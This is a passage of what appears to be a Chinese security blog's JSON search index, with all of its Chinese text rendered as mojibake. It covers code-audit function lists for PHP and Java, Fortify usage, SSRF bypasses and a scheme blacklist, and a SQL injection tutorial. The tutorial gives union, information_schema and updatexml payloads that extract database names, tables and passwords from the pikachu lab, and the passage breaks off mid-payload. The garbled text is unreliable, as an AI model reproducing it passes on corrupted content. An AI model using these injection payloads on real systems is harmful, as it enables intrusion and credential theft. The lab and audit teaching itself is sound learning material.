çš„æ–¹æ³•ã€‚å¤§å¤šæ•°æ¼æ´çš„äº§ç”Ÿæ˜¯å› ä¸ºå‡½æ•°çš„ä½¿ç”¨ä¸å½“å¯¼è‡´çš„ï¼Œåªè¦æ‰¾åˆ°è¿™äº›å‡½æ•°ï¼Œå°±èƒ½å¤Ÿå¿«é€ŸæŒ–æ˜æƒ³è¦çš„æ¼æ´ã€‚ ğŸ§¨ä»£ç å®‰å…¨æµ‹è¯•æ–¹æ³• ä»£ç å®¡æ ¸é‡‡ç”¨äººå·¥å®¡æ ¸å’Œé™æ€åˆ†æå·¥å…·è¾…åŠ©çš„æ–¹å¼è¿›è¡Œã€‚ äººå·¥å®¡æ ¸ï¼šæ—¢èƒ½è§£å†³å†…éƒ¨é—®é¢˜ä¹Ÿèƒ½è§£å†³å¤–éƒ¨é—®é¢˜ã€‚è¿™ä¹Ÿæ˜¯ç›®å‰æœ€æœ‰æ•ˆç‡çš„è§£å†³æ–¹æ¡ˆï¼Œå¹¶ä¸”åœ¨ç†è®ºä¸Šæ‰‹å·¥ä»£ç å®¡æ ¸æ˜¯éå¸¸æœ‰æ•ˆçš„ï¼Œä½†äººå·¥å®¡æ ¸çš„æ•ˆç‡ä¸é«˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šé‡‡ç”¨è‡ªåŠ¨åŒ–åˆ†æå·¥å…·è¾…åŠ©äººå·¥çš„æ–¹å¼æ¥æé«˜å®¡æ ¸æ•ˆç‡ã€‚ é™æ€åˆ†æå·¥å…·ï¼šé€šè¿‡ä¸€ç»„å…¨é¢è§„åˆ™ã€æµ‹è¯•æœºåˆ¶å’Œæ–¹é’ˆåœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ã€æµ‹è¯•ä¸­å‘ç°è½¯ä»¶çš„å®‰å…¨ç¼ºé™·ã€‚ 1ï¼Œfortify â€‹ 2ï¼Œseayæºä»£ç å®¡è®¡ ğŸ§¶äººå·¥ä»£ç å®¡è®¡çš„é€šç”¨æ€è·¯ 1ã€é€šè¯»å…¨æ–‡ä»£ç ï¼Œä»åŠŸèƒ½å‡½æ•°ä»£ç å¼€å§‹é˜…è¯»ï¼Œä¾‹å¦‚includeæ–‡ä»¶å¤¹ä¸‹çš„common_fun.phpï¼Œæˆ–è€…æœ‰ç±»ä¼¼å…³é”®å­—çš„æ–‡ä»¶ã€‚ 2ã€çœ‹é…ç½®æ–‡ä»¶ï¼Œå¸¦æœ‰configå…³é”®å­—çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°mysql.class.phpæ–‡ä»¶çš„connect()å‡½æ•°ï¼ŒæŸ¥çœ‹åœ¨æ•°æ®åº“è¿æ¥æ—¶æ˜¯å¦å‡ºç°æ¼æ´ã€‚ 3ã€ç»§ç»­è·Ÿè¯»é¦–é¡µæ–‡ä»¶index.php,äº†è§£ç¨‹åºè¿ä½œæ—¶è°ƒç”¨äº†å“ªäº›å‡½æ•°å’Œæ–‡ä»¶ä»¥index.phpæ–‡ä»¶ä½œä¸ºæ ‡çº¿ï¼Œä¸€å±‚ä¸€å±‚å»æ‰©å±•é˜…è¯»æ‰€åŒ…å«çš„æ–‡ä»¶ï¼Œäº†è§£å…¶åŠŸèƒ½ï¼Œä¹‹åè¿›å…¥å…¶åŠŸèƒ½æ–‡ä»¶å¤¹çš„é¦–é¡µæ–‡ä»¶ï¼Œè¿›è¡Œæ‰©å±•é˜…è¯»ã€‚ ğŸ§µæ¼æ´äº§ç”Ÿçš„åŸå›  1ã€å˜é‡æ§åˆ¶ä¸ä¸¥ï¼ˆä¸€åˆ‡è¾“å…¥éƒ½æ˜¯æœ‰å®³ï¼‰ã€‚ 2ã€å˜é‡åˆ°è¾¾æœ‰åˆ©ç”¨ä»·å€¼çš„å‡½æ•°ï¼ˆä¸€åˆ‡è¿›å…¥å‡½æ•°çš„å˜é‡æ˜¯æœ‰å®³çš„ï¼‰ï¼Œæ¼æ´çš„åˆ©ç”¨æ•ˆæœå–å†³äºæœ€ç»ˆå‡½æ•°çš„åŠŸèƒ½ã€‚ åŸºäºå…³é”®è¯å®¡è®¡æŠ€å·§æ€»ç»“ï¼šåœ¨æœç´¢æ—¶è¦æ³¨æ„æ˜¯å¦ä¸ºæ•´ä¸ªå•è¯,ä»¥åŠå°å†™æ•æ„Ÿè¿™äº›è®¾ç½® phpå®¡è®¡å‘½ä»¤æ‰§è¡Œæ¼æ´ systemï¼ˆï¼‰ã€execï¼ˆï¼‰ã€shell_execï¼ˆï¼‰ã€passthruï¼ˆï¼‰ã€pcntl_execï¼ˆï¼‰ã€popenï¼ˆï¼‰ã€proc_openï¼ˆï¼‰ ä»£ç æ‰§è¡Œæ¼æ´ evalï¼ˆï¼‰ã€assertï¼ˆï¼‰ã€preg_replaceï¼ˆï¼‰ã€call_user_funcï¼ˆï¼‰ã€call_user_func_arrayï¼ˆï¼‰ã€array_mapï¼ˆï¼‰ xssï¼šå¸¸ç”¨çš„è¾“å‡ºå‡½æ•°åˆ—è¡¨å¦‚ä¸‹ï¼š printã€print_rã€echoã€printfã€sprintfã€dieã€var_dumpã€var_exportï¼Œ æ–‡ä»¶è¯»å–å‡½æ•°åˆ—è¡¨å¦‚ä¸‹ï¼š file_get_contentsï¼ˆï¼‰ã€highlight_fileï¼ˆï¼‰ã€fopenï¼ˆï¼‰ã€readfileï¼ˆï¼‰ã€freadï¼ˆï¼‰ã€fgetssï¼ˆï¼‰ã€fgetsï¼ˆï¼‰ã€parse_ini_fileï¼ˆï¼‰ã€show_sourceï¼ˆï¼‰ã€fileï¼ˆï¼‰ sqlæ³¨å…¥å…³é”®å­—: selectã€insertã€updateã€$_GETã€$_POSTã€$_REQUESTã€ ä¸Šä¼ æ¼æ´å…³é”®å­—: $_FILES ã€move_uploaded_file æ‰§è¡Œæ¼æ´å…³é”®å­—: shell_execã€execã€passthru systemã€popen åŒ…å«æ¼æ´å…³é”®å­—: includeã€include_onceã€requireã€require_once å˜é‡è¦†ç›–å…³é”®å­—: $$ è·¨ç«™æ¼æ´å…³é”®å­—: echoã€printã€print_rã€var_dumpã€var_exprot,insert javaå®¡è®¡å¯†ç ç¡¬ç¼–ç ã€å¯†ç æ˜æ–‡å­˜å‚¨ï¼š password ã€passã€jdbc XSSï¼š getParamterã€&lt;%=ã€param. ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š download ã€fileName ã€filePathã€writeã€getFileã€getWriter ä»»æ„æ–‡ä»¶åˆ é™¤ï¼š Deleteã€deleteFileã€fileName ã€filePath æ–‡ä»¶ä¸Šä¼ ï¼š Uploadã€writeã€fileName ã€filePath å‘½ä»¤æ³¨å…¥ï¼š getRuntimeã€execã€cmdã€shell ç¼“å†²åŒºæº¢å‡ºï¼š strcpy,strcat,scanf,memcpy,memmove,memeccpyï¼Œ Getc(),fgetc(),getchar;read,printf XML æ³¨å…¥ï¼š DocumentBuilderã€XMLStreamReaderã€SAXBuilderã€SAXParser SAXReader ã€XMLReader SAXSource ã€TransformerFactory ã€SAXTransformerFactory ã€ SchemaFactory ååºåˆ—åŒ–æ¼æ´ï¼š ObjectInputStream.readObject ã€ObjectInputStream.readUnsharedã€XMLDecoder.readObject Yaml.load ã€ XStream.fromXML ã€ ObjectMapper.readValue ã€ JSON.parseObject url è·³è½¬ï¼š sendRedirectã€setHeaderã€forward ä¸å®‰å…¨ç»„ä»¶æš´éœ²ï¼š activity ã€ Broadcast Receiver ã€ Content Provider ã€ Service ã€ inter-filter æ—¥å¿—è®°å½•æ•æ„Ÿä¿¡æ¯ï¼š log log.info logger.info ä»£ç æ‰§è¡Œï¼š evalã€systemã€exec å·¥å…·å±€é™æ€§ï¼š å·¥å…·æœ¬èº«å­˜åœ¨ä¸€å®šé‡çš„è¯¯æŠ¥æˆ–è€…æ¼æŠ¥ã€‚ æ‰«æç»“æœéœ€è¦å¤§é‡äººå·¥ç¡®å®šç”„åˆ«ã€‚ å¦‚ç”¨å¤šç§è¯­è¨€å¼€å‘çš„è½¯ä»¶ï¼Œåˆ™éœ€å•ç‹¬åˆ†æã€‚ ä½¿ç”¨å·¥å…·ç¼ºä¹è§„èŒƒåŒ–çš„ç¼–ç è§„èŒƒã€‚ ä¸èƒ½è‡ªåŠ¨æ”¶é›†å¸¸è§çš„ä»£ç å®‰å…¨é—®é¢˜ã€‚ fortifyä½¿ç”¨ğŸƒç®€ä»‹ Fortify æ˜¯ä¸€ä¸ªé™æ€çš„ã€ç™½ç›’çš„è½¯ä»¶æºä»£ç å®‰å…¨æµ‹è¯•å·¥å…·ã€‚å®ƒé€šè¿‡å†…ç½®çš„äº”å¤§ä¸»è¦åˆ†æå¼•æ“ï¼šæ•°æ®æµã€è¯­ä¹‰ã€ç»“æ„ã€æ§åˆ¶æµã€é…ç½®æµç­‰å¯¹åº”ç”¨è½¯ä»¶çš„æºä»£ç è¿›è¡Œé™æ€çš„åˆ†æï¼Œé€šè¿‡ä¸è½¯ä»¶å®‰å…¨æ¼æ´è§„åˆ™é›†è¿›è¡ŒåŒ¹é…ã€æŸ¥æ‰¾ï¼Œä»è€Œå°†æºä»£ç ä¸­å­˜åœ¨çš„å®‰å…¨æ¼æ´æ‰«æå‡ºæ¥ï¼Œå¹¶å¯å¯¼å‡ºæŠ¥å‘Šã€‚æ‰«æçš„ç»“æœä¸­åŒ…æ‹¬è¯¦ç»†çš„å®‰å…¨æ¼æ´ä¿¡æ¯ã€ç›¸å…³çš„å®‰å…¨çŸ¥è¯†ã€ä¿®å¤æ„è§ã€‚ åŸğŸ›’ç† -é¦–å…ˆé€šè¿‡è°ƒç”¨è¯­è¨€çš„ç¼–è¯‘å™¨æˆ–è€…è§£é‡Šå™¨æŠŠå‰ç«¯çš„è¯­è¨€ä»£ç ï¼ˆå¦‚JAVAï¼ŒC/C++æºä»£ç ï¼‰è½¬æ¢æˆä¸€ç§ä¸­é—´åª’ä½“æ–‡ä»¶NSTï¼ˆNormal Syntax Treeï¼‰ï¼Œå°†å…¶æºä»£ç ä¹‹é—´çš„è°ƒç”¨å…³ç³»ï¼Œæ‰§è¡Œç¯å¢ƒï¼Œä¸Šä¸‹æ–‡ç­‰åˆ†ææ¸…æ¥šã€‚ -é€šè¿‡åˆ†æä¸åŒç±»å‹é—®é¢˜çš„é™æ€åˆ†æå¼•æ“åˆ†æNSTæ–‡ä»¶ï¼ŒåŒæ—¶åŒ¹é…æ‰€æœ‰è§„åˆ™åº“ä¸­çš„æ¼æ´ç‰¹å¾ï¼Œå°†æ¼æ´æŠ“å–å‡ºæ¥ï¼Œç„¶åå½¢æˆåŒ…å«è¯¦ç»†æ¼æ´ä¿¡æ¯çš„FPRç»“æœæ–‡ä»¶ï¼Œç”¨AWBæ‰“å¼€æŸ¥çœ‹ã€‚ æ”¯æŒè¯­è¨€ 1.asp.net 2.VB.Net 3.c#.Net 4.ASP 5.VS6 7.java 8.JSP 9.javascript 10.HTML 11.XML 12.C/C++ 13.PHP 14.T-SQL 15.PL/SQL 16.Action script 17.Object-C (iphone-2012/5) 18.ColdFusion5.0 - 19.python - 20.COBOL - 21.SAP-ABAP - æ‰«ææ­¥éª¤é…ç½®ä¿¡æ¯ï¼šHP Fortify SCA and Applications 4.10+WIN10ï¼ˆ64ä½å®¶åº­ç‰ˆï¼‰æ­¥éª¤1ã€æ‰“å¼€fortifyçš„å·¥ä½œå° æ­¥éª¤2ã€å¦‚æœæºä»£ç æ˜¯javaï¼Œé€‰æ‹©Scan Javaï¼Œæºç æ˜¯C#é€‰æ‹©Scan VSï¼Œä¸çŸ¥é“çš„è¯é€‰æ‹©Advanced Scan æ­¥éª¤3ã€é€‰æ‹©ä»£ç æ–‡ä»¶å¤¹ï¼ˆä¸å»ºè®®å°†æ–‡ä»¶å¤¹æ‹†å¼€ï¼Œå¦‚æœæ–‡ä»¶å¤¹è¿‡å¤§ï¼Œå¯è¦æ±‚å¼€å‘äººå‘˜æ‹†å¼€ï¼ŒæŒ‰æ–‡ä»¶å¤¹åˆ†å¼€æ‰«æï¼‰ æ­¥éª¤4ã€ç¡®å®šåï¼Œå¼¹å‡ºé€šçŸ¥æ¡†ï¼Œå¦‚ä¸‹å›¾ï¼Œé€‰æ‹©javaç‰ˆæœ¬ï¼Œç‚¹å‡»OK æ ¹æ®æƒ…å†µé€‰æ‹©åï¼Œç‚¹å‡»Scanï¼Œç­‰å¾…æ‰«æ æ­¥éª¤5ã€æ‰«æå®Œæˆåçš„ç•Œé¢ tipsï¼šå¯é€šè¿‡èœå•æ è¿›è¡Œç•Œé¢çš„ç»„ä»¶çš„é…ç½® æ­¥éª¤6ã€å¯¹ç»“æœè¿›è¡Œåˆ†æï¼Œå¡«å†™åˆ†æç»“è®ºåŠå¤‡æ³¨ä¿¡æ¯ æ­¥éª¤7ã€ç‚¹å‡»èœå•æ çš„reportsï¼Œé€‰æ‹©å®¡è®¡è§„åˆ™ï¼Œå¯¼å‡ºå³å¯ ã€","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"SSRFæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ","slug":"SSRFæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ","date":"2019-08-08T12:04:42.000Z","updated":"2020-09-20T09:03:31.607Z","comments":true,"path":"2019/08/08/SSRFæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ /","link":"","permalink":"https://zhangyanlady.github.io/2019/08/08/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","excerpt":"","text":"æ€»ç»“å›¾ å®šä¹‰ï¼š æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼šæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œssrfæ˜¯è¦ç›®æ ‡ç½‘ç«™çš„å†…éƒ¨ç³»ç»Ÿï¼Œå› ä¸ºä»–æ˜¯ä»å†…éƒ¨ç³»ç»Ÿè®¿é—®çš„ï¼Œæ‰€æœ‰å¯èƒ½é€šè¿‡å®ƒæ”»å‡»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯è¯´æŠŠç›®æ ‡ç½‘ç«™å½“ä¸­é—´äºº å½¢æˆåŸå› ï¼š å¤§éƒ½æ˜¯ç”±äºæœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤å’Œé™åˆ¶ æ¯”å¦‚ä»æŒ‡å®šurlè·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šç½‘ç«™çš„å›¾ç‰‡ï¼Œæ–‡æ¡£ç­‰ æ¼æ´çš„æŒ–æ˜ï¼š1ã€é€šè¿‡webåŠŸèƒ½å¯»æ‰¾1ï¼‰åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ 2ï¼‰è½¬ç æœåŠ¡ 3ï¼‰åœ¨çº¿ç¿»è¯‘ 4ï¼‰å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ 5ï¼‰å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½ 6ï¼‰æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½ 2ã€é€šè¿‡urlå…³é”®å­—å¯»æ‰¾share wap url link src source target u 3g display sourceURl imageURL domain 3ã€é€šè¿‡æ‰«æå™¨å·¥å…·å¯»æ‰¾ç»•è¿‡æ–¹æ³•ï¼š æ›´æ”¹ipåœ°å€å†™æ³•ï¼šè½¬æ¢è¿›åˆ¶ åˆ©ç”¨è§£æurlå‡ºç°çš„é—®é¢˜ httP://www.oldboyedu.com@192.168.0.1/ ä¸æ­£ç¡®çš„æ­£åˆ™åŒ¹é…ï¼šhttpä¹‹ååˆ°comä¹‹å‰ åˆ©ç”¨åè®® é˜²èŒƒï¼ˆé»‘åå•ï¼‰ ï¼ˆ1ï¼‰è¿‡æ»¤10.0.0.0/8ã€172.16.0.0/12ã€192.168.0.0/16ã€localhostç§æœ‰åœ°å€ã€IPv6åœ°å€ ï¼ˆ2ï¼‰è¿‡æ»¤file:///ã€dict://ã€gopher://ã€ftp:// å±é™©schema ï¼ˆ3ï¼‰å¯¹è¿”å›çš„å†…å®¹è¿›è¡Œè¯†åˆ« ï¼ˆ4ï¼‰å†…ç½‘æœåŠ¡å¼€å¯é‰´æƒï¼ˆMemcached, Redis, Elasticsearch and MongoDBï¼‰","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"XXE","slug":"XXE","date":"2019-08-01T03:05:18.000Z","updated":"2020-09-20T08:51:33.277Z","comments":true,"path":"2019/08/01/XXE/","link":"","permalink":"https://zhangyanlady.github.io/2019/08/01/XXE/","excerpt":"","text":"æ€»ç»“å›¾","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","date":"2019-07-26T15:01:26.000Z","updated":"2020-09-20T09:03:18.071Z","comments":true,"path":"2019/07/26/sqlæ³¨å…¥/","link":"","permalink":"https://zhangyanlady.github.io/2019/07/26/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"æ³¨å…¥æ€»ç»“å›¾ 1.0 åŸç†æ³¨å…¥äº§ç”Ÿçš„åŸå› æ˜¯æ¥å—ç›¸å…³å‚æ•°æœªç»å¤„ç†ç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢æ“ä½œ 1.1 æ”»å‡»æ¡ä»¶ ç¡®å®šWebåº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„æŠ€æœ¯ å¯ä»¥è€ƒå¯ŸWebé¡µé¢çš„é¡µè„š æŸ¥çœ‹é”™è¯¯é¡µé¢ æ£€æŸ¥é¡µé¢æºä»£ç  ä½¿ç”¨è¯¸å¦‚Nessusã€AWVSã€APPSCANç­‰å·¥å…·æ¥è¿›è¡Œåˆºæ¢ ç¡®å®šæ‰€æœ‰å¯èƒ½çš„è¾“å…¥æ–¹å¼ HTMLè¡¨å• é€šè¿‡éšè—çš„HTMLè¡¨å•è¾“å…¥ã€HTTPå¤´éƒ¨ã€cookiesã€ç”šè‡³å¯¹ç”¨æˆ·ä¸å¯è§çš„åç«¯AJAXè¯·æ±‚æ¥è·ŸWebåº”ç”¨è¿›è¡Œäº¤äº’M HTTPçš„GETå’ŒPOST æŸ¥æ‰¾å¯ä»¥ç”¨äºæ³¨å°„çš„ç”¨æˆ·è¾“å…¥ å¤šç•™æ„Webåº”ç”¨çš„é”™è¯¯é¡µé¢ 1.2 æ³¨å…¥å‰çš„å‡†å¤‡åŠæ³¨å…¥æ¼æ´æ£€æµ‹ æ˜¾ç¤ºå‹å¥½HTTPé”™è¯¯ä¿¡æ¯ å–æ¶ˆIEæµè§ˆå™¨è¿”å›ä¿¡æ¯è®¾ç½®ï¼Œä»¥ä¾¿æŸ¥çœ‹åˆ°æ³¨å…¥æ”»å‡»æ—¶è¿”å›çš„æ•°æ®åº“ä¿¡æ¯ æ‰“å¼€IEæµè§ˆå™¨ï¼Œé€‰æ‹©èœå•â€œå·¥å…·â€ä¸€â€œInterneté€‰é¡¹â€å‘½ä»¤ï¼Œæ‰“å¼€â€œInterneté€‰é¡¹â€å¯¹è¯æ¡†ã€‚æ‰“å¼€â€œé«˜çº§â€é€‰é¡¹å¡ï¼Œåœ¨â€œè®¾ç½®â€åˆ—è¡¨æ¡†ä¸­æ‰¾åˆ°â€œæµè§ˆç»„â€ï¼Œå–æ¶ˆå‹¾é€‰â€œæ˜¾ç¤ºå‹å¥½HTTPé”™è¯¯ä¿¡æ¯â€ æ‰‹å·¥æ£€æµ‹sqlæ³¨å…¥ç‚¹ å¯»æ‰¾å¦‚ä¸‹å½¢å¼çš„ç½‘é¡µé“¾æ¥ã€‚ï¼ˆæœ€å¸¸è§ï¼‰ http://www.*****.com/***.asp?id=xx (ASPæ³¨å…¥) http://www.*****.com/index.asp?id=8&amp;page=99 (æ³¨:æ³¨å…¥çš„æ—¶å€™ç¡®è®¤æ˜¯idå‚æ•°è¿˜æ˜¯pageå‚æ•°ï¼Œå·¥å…·é»˜è®¤åªå¯¹åé¢pageå‚æ•°æ³¨å…¥ï¼Œæ‰€ä»¥è¦å¯¹å·¥å…·è¿›è¡Œé…ç½®æˆ–è€…æ‰‹å·¥è°ƒæ¢) æ£€æµ‹æ–¹æ³• â€œå•å¼•å·â€æ³• 1=1å’Œ1=2æ³• 1.3 æ³¨å…¥åˆ†ç±» æ•°å­—å‹(or 1=1) é€šè¿‡burpæŠ“åŒ…è¾“å…¥ä¸€ä¸ªor 1=1è®¾ç½®ä¸€ä¸ªpayload,ç‚¹å‡»æäº¤åï¼Œåœ¨Renderä¸­æŸ¥çœ‹ç»“æœã€‚é€šè¿‡åˆ¤æ–­å­˜åœ¨SQLæ³¨å…¥ï¼Œä¸”ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡æ‹¼æ¥SQLè¯­å¥æ¥å®ç°æ³¨å…¥ã€‚ å­—ç¬¦å‹(â€˜or 1=1#â€™) åœ¨vinceåé¢æ·»åŠ å•å¼•å·æ¥é—­åˆvinceï¼Œå†åœ¨1=1åé¢æ·»åŠ æ³¨é‡Š#æ¥æ¶ˆé™¤æ‰åé¢çš„å•å¼•å·ï¼Œè¿™æ ·æ¥å®Œæˆä¸€ä¸ªSQLè¯­å¥çš„æ‹¼æ¥åˆæ³•æ€§ã€‚å®Œæ•´çš„è¯­å¥ä¸ºselect id,email from member where username=â€™vinceâ€˜ or 1=1#â€™ï¼›æˆ‘ä»¬å›åˆ°pikachuå¹³å°è¾“å…¥vinceâ€˜ or 1=1# æœç´¢å‹(%xxxx%â€™or 1=1 #%â€™) å°†æ‹¼æ¥è¯­å¥å†™ä¸º%xxxx%â€™or 1=1 #%â€™ xxå‹(XXâ€™) or 1=1#) XXå‹æ˜¯ç”±äºSQLè¯­å¥æ‹¼æ¥æ–¹å¼ä¸åŒ æ‹¼æ¥è¯­å¥å†™ä¸ºXXâ€™) or 1=1# 1.4 æ³¨å…¥æäº¤æ–¹å¼ASPï¼šrequest ï¼ˆå…¨éƒ¨æ¥å—ï¼‰ã€request.querystring ï¼ˆæ¥å—getï¼‰ã€request.form ï¼ˆæ¥å—postï¼‰ã€ request.cookie cookie ï¼ˆæ¥å—cookieï¼‰ PHP: $_REQUESTï¼ˆå…¨éƒ¨æ¥å—ï¼‰ã€$_GET $_POST ï¼ˆæ¥å—postï¼‰ã€$_COOKIEï¼ˆæ¥å—cookieï¼‰ 1.5 æ³¨å…¥æ”»å‡»ç±»å‹ä¸æ–¹å¼ unionæ³¨å…¥ unionæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªSQLè¯­å¥é›†åˆèµ·æ¥ï¼Œå¾—åˆ°è”åˆçš„æŸ¥è¯¢ç»“æœ select id,email from member where username=â€™kevinâ€™ union select username,pw from member where id=1; æ³¨ï¼šunionæ“ä½œç¬¦ä¸€èˆ¬ä¸order byè¯­å¥é…åˆä½¿ç”¨ è¾“å…¥aâ€™ order by 3#% ï¼Œé€šè¿‡è¿™ä¸ªç®€å•çš„åŠæ³•æ‰¾åˆ°ä¸»æŸ¥è¯¢ä¸€å…±æœ‰ä¸‰ä¸ªå­—æ®µ ä¹‹åæˆ‘ä»¬æ¥ä½¿ç”¨unionæ¥åšä¸€ä¸ªSQLè¯­å¥çš„æ‹¼æ¥ã€‚è¾“å…¥æ„é€ å¥½çš„è¯­å¥aâ€™ union select database(),user(),version()#% information_schemaæ³¨å…¥ information_schemaæ•°æ®åº“æ˜¯MySQLç³»ç»Ÿè‡ªå¸¦çš„æ•°æ®åº“ é€šè¿‡information_schemaæ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•´ä¸ªæ•°æ®åº“å†…å®¹å…¨éƒ¨çªƒå–å‡ºæ¥, ä½¿ç”¨order byæ¥åˆ¤æ–­æŸ¥è¯¢çš„å­—æ®µ æ‰¾å‡ºæ•°æ®åº“çš„åç§°ï¼Œè¾“å…¥vinceâ€™ union select database(),user(),3#% è·å–pikachuæ•°æ®åº“çš„è¡¨åï¼Œè¾“å…¥:uâ€™ union select table_schema ,table_name,3 from information_schema.tables where table_schema=â€™pikachuâ€™# è·å–pikachuæ•°æ®åº“çš„å­—æ®µåï¼Œè¾“å…¥ï¼š kâ€™ union select table_name,column_name,3 from information_schema.columns where table_name=â€™usersâ€™#% æœ€åè·å–å­—æ®µå€¼çš„å†…å®¹ï¼Œè¾“å…¥ï¼škobeâ€™union select username ,password,3 from users#% åŸºäºå‡½æ•°çš„æŠ¥é”™ æ¡ä»¶ï¼šåå°æ²¡æœ‰å±è”½æ•°æ®åº“æŠ¥é”™ä¿¡æ¯,åœ¨è¯­æ³•å‘ç”Ÿé”™è¯¯æ—¶ä¼šè¾“å‡ºåœ¨å‰ç«¯ ä¸‰ä¸ªå¸¸ç”¨çš„ç”¨æ¥æŠ¥é”™çš„å‡½æ•° updatexmlï¼ˆï¼‰:å‡½æ•°æ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„XPATHå‡½æ•°. 1ã€çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ kâ€™ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) # 2ã€çˆ†æ•°æ®åº“å½“å‰ç”¨æˆ· kâ€™ and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)# 3ã€çˆ†æ•°æ®åº“ kâ€™ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) # 4ã€çˆ†è¡¨ è·å–æ•°æ®åº“è¡¨åï¼Œè¾“å…¥ï¼škâ€™and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=â€™pikachuâ€™)),0)#ï¼Œä½†æ˜¯åé¦ˆå›çš„é”™è¯¯è¡¨ç¤ºåªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼Œæ‰€ä»¥é‡‡ç”¨limitæ¥ä¸€è¡Œä¸€è¡Œæ˜¾ç¤º è¾“å…¥kâ€™ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=â€™pikachuâ€™limit 0,1)),0)#æ›´æ”¹limitåé¢çš„æ•°å­—limit 0å®Œæˆè¡¨åéå†ã€‚ 5ã€çˆ†å­—æ®µ è·å–å­—æ®µåï¼Œè¾“å…¥ï¼škâ€™ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=â€™usersâ€™limit 2,1)),0)# 6ã€çˆ†å­—æ®µå†…å®¹ è·å–å­—æ®µå†…å®¹ï¼Œè¾“å…¥ï¼škâ€™ and 